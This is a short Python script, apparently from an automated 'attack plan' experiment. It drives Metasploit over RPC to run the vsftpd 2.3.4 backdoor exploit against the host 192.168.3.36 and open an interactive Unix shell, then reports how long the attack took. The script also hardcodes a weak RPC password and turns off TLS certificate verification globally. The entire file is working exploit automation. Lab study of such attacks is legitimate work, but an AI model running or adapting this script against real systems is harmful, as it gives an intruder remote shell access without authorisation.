from pymetasploit3.msfrpc import MsfRpcClient
import time
import os, ssl

if (not os.environ.get('PYTHONHTTPSVERIFY', '') and
getattr(ssl, '_create_unverified_context', None)):
  ssl._create_default_https_context = ssl._create_unverified_context

client = MsfRpcClient('123456', ssl=True)

#print(client.modules.exploits)

start = time.time()

print("======ASAP Attack Plan Start======")

exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
print(exploit.description)
print("======Exploit Started======")
exploit['RHOSTS'] = '192.168.3.36'

print("Shell Obtained:",exploit.execute(payload='cmd/unix/interact'))
end =time.time()
print("Time for Attack Plan Execution:", end-start)

print("======ASAP Attack Plan End======")

